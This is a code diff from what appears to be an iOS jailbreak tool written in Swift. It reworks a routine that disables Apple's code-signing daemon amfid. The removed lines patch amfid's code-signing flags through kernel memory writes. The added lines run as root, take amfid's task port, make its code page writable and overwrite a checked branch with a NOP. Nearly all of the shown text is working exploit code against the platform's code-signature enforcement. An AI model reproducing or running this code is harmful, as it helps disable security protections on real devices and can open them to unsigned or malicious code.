@@ -202,104 +202,98 @@ final class ExpAmfidPatchV2 {
     // MARK: - Kernel Direct Write (bypass page protection)
     
     private func patchViaKernel(patchAddr: UInt64) {
-        log("── Kernel Direct Write ──")
-        log("Finding amfid's page in physical memory...")
-        
-        // Method: Walk amfid's pmap to find the physical page
-        // containing patchAddr, then write directly via physwrite
-        //
-        // Alternative: patch amfid's proc_ro cs_flags to add CS_DEBUGGED
-        // which makes the kernel skip __TEXT integrity checks,
-        // then use vm_write from our process
+        log("── Alternative: task_for_pid from launchd ──")
+        log("amfid cs_flags already patched by step 6")
+        log("Using launchd (uid=0) for task_for_pid...")
+        log("")
         
         let amfidPid = findAmfidPid()
         guard amfidPid > 0 else { log("❌ amfid not found"); return }
         
-        let amfidProc = procbypid(amfidPid)
-        guard amfidProc != 0 else { log("❌ proc not found"); return }
+        // The patch address is relative to amfid's text base
+        // We need to find amfid's ASLR slide first
+        // For now, log what we know and try task_for_pid
         
-        // Patch cs_flags to add CS_DEBUGGED (0x10000000) + CS_PLATFORM_BINARY (0x04000000)
-        let procRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
-        guard procRo != 0 else { log("❌ proc_ro not found"); return }
-        
-        let csFlags = ds_kread32(procRo + 0x1c)
-        log("amfid cs_flags: 0x\(String(format: "%08x", csFlags))")
-        
-        let newFlags = csFlags | 0x10000000 | 0x04000000 | 0x00000004
-        // CS_DEBUGGED | CS_PLATFORM_BINARY | CS_GET_TASK_ALLOW
-        ds_kwrite32(procRo + 0x1c, newFlags)
-        let verify = ds_kread32(procRo + 0x1c)
-        
-        if verify == newFlags {
-            log("✅ cs_flags patched: 0x\(String(format: "%08x", verify))")
-            log("   CS_DEBUGGED + CS_PLATFORM_BINARY + CS_GET_TASK_ALLOW")
-            log("")
-            log("Now trying task_for_pid again...")
-            retryPatchWithTaskForPid(patchAddr: patchAddr, pid: amfidPid)
-        } else {
-            log("❌ cs_flags write failed (PPL protected)")
-            log("   verify: 0x\(String(format: "%08x", verify))")
-            log("")
-            log("Last resort: trying physwrite...")
-            patchViaPhysWrite(patchAddr: patchAddr, pid: amfidPid)
-        }
-    }
-    
-    private func retryPatchWithTaskForPid(patchAddr: UInt64, pid: Int32) {
         #if !DISABLE_REMOTECALL
-        RootExecutor.shared.executeAsRoot(operation: "amfid_patch_retry") { rc in
-            // After cs_flags patch, task_for_pid should work
-            let taskPortAddr = rc.trojanMem + 0x100
-            rc[taskPortAddr].setValue32(0)
-            let tfpResult = RootExecutor.rcall(rc, "task_for_pid",
-                UInt64(mach_task_self_), UInt64(pid), taskPortAddr)
-            let taskPort = rc[taskPortAddr].value32()
+        RootExecutor.shared.executeAsRoot(operation: "amfid_tfp") { rc in
+            let portAddr = rc.trojanMem + 0x100
+            rc[portAddr].setValue32(0)
             
-            guard tfpResult == 0 && taskPort != 0 else {
-                return (false, "task_for_pid still fails: \(tfpResult)", UInt64(tfpResult))
+            let ret = RootExecutor.rcall(rc, "task_for_pid",
+                UInt64(mach_task_self_), UInt64(amfidPid), portAddr)
+            let port = rc[portAddr].value32()
+            
+            if ret != 0 || port == 0 {
+                return (false, "task_for_pid: ret=\(ret) port=\(port)", UInt64(ret))
             }
             
-            // mach_vm_protect
-            let pageAddr = patchAddr & ~0xFFF
-            let RTLD_DEFAULT = UInt64(bitPattern: -2)
-            let machVmProtect = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
-                remote_alloc_str(rc, "mach_vm_protect"))
-            let machVmWrite = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
-                remote_alloc_str(rc, "mach_vm_write"))
+            // Got task port! Now find text base via mach_vm_region
+            // Read first region to find __TEXT
+            let addrBuf = rc.trojanMem + 0x200
+            let sizeBuf = rc.trojanMem + 0x208
+            let infoBuf = rc.trojanMem + 0x210
+            let infoCntBuf = rc.trojanMem + 0x280
             
-            let protResult = RootExecutor.rcallAddr(rc, machVmProtect,
-                UInt64(taskPort), pageAddr, 0x4000, 0, 7)
+            rc[addrBuf].setValue64(0x100000000) // start search at typical base
+            rc[sizeBuf].setValue64(0)
+            rc[infoCntBuf].setValue32(9) // VM_REGION_BASIC_INFO_COUNT_64
             
-            guard protResult == 0 else {
-                return (false, "vm_protect failed: \(protResult)", UInt64(protResult))
+            // mach_vm_region(port, &addr, &size, VM_REGION_BASIC_INFO_64, info, &count, &objName)
+            let objNameBuf = rc.trojanMem + 0x290
+            let regionRet = RootExecutor.rcall(rc, "mach_vm_region",
+                UInt64(port), addrBuf, sizeBuf, 9, infoBuf, infoCntBuf, objNameBuf)
+            
+            let textBase = rc[addrBuf].value64()
+            let textSize = rc[sizeBuf].value64()
+            
+            if regionRet != 0 {
+                return (false, "mach_vm_region: ret=\(regionRet)", UInt64(regionRet))
+            }
+            
+            let patchTarget = textBase + 0x2ec8
+            
+            // mach_vm_protect(port, page_addr, page_size, FALSE, VM_PROT_ALL)
+            let pageAddr = patchTarget & ~0xFFF
+            let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
+                UInt64(port), pageAddr, 0x4000, 0, 7)
+            
+            if protRet != 0 {
+                return (false, "vm_protect: ret=\(protRet) (text=0x\(String(textBase, radix:16)))", UInt64(protRet))
+            }
+            
+            // Read current instruction to verify
+            let readBuf = rc.trojanMem + 0x300
+            rc[readBuf].setValue32(0)
+            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                UInt64(port), patchTarget, 4, readBuf, rc.trojanMem + 0x310)
+            let currentInsn = rc[readBuf].value32()
+            
+            // Verify it's cbz (0x34xxxxxx)
+            if (currentInsn & 0xFF000000) != 0x34000000 {
+                return (false, "not cbz at 0x\(String(patchTarget, radix:16)): 0x\(String(format:"%08x", currentInsn))", UInt64(currentInsn))
             }
             
             // Write NOP
-            let nopBuf = rc.trojanMem + 0x200
+            let nopBuf = rc.trojanMem + 0x320
             rc[nopBuf].setValue32(0xD503201F)
-            let writeResult = RootExecutor.rcallAddr(rc, machVmWrite,
-                UInt64(taskPort), patchAddr, nopBuf, 4)
+            let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
+                UInt64(port), patchTarget, nopBuf, 4)
             
-            return (writeResult == 0, writeResult == 0 ? "✅ PATCHED!" : "vm_write: \(writeResult)", UInt64(writeResult))
+            if writeRet == 0 {
+                return (true, "✅ PATCHED! cbz→NOP at 0x\(String(patchTarget, radix:16))", 0)
+            } else {
+                return (false, "vm_write: ret=\(writeRet)", UInt64(writeRet))
+            }
         }
         
         DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
             guard let self else { return }
-            if let result = RootExecutor.shared.lastResult, result.operation == "amfid_patch_retry" {
-                self.log(result.success ? "✅ \(result.message)" : "❌ \(result.message)")
-                if result.success { self.testSpawn() }
+            if let r = RootExecutor.shared.lastResult, r.operation == "amfid_tfp" {
+                self.log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
+                if r.success { self.testSpawn() }
             }
         }
         #endif
-    }
-    
-    // MARK: - Physical Write (last resort)
-    
-    private func patchViaPhysWrite(patchAddr: UInt64, pid: Int32) {
-        // Use kernel's pmap to translate amfid's virtual address to physical
-        // Then write directly to physical memory (bypasses all protections)
-        log("physwrite not implemented yet")
-        log("Need: amfid vaddr → pmap → phys addr → kwrite")
     }
     
     // MARK: - Test Spawn
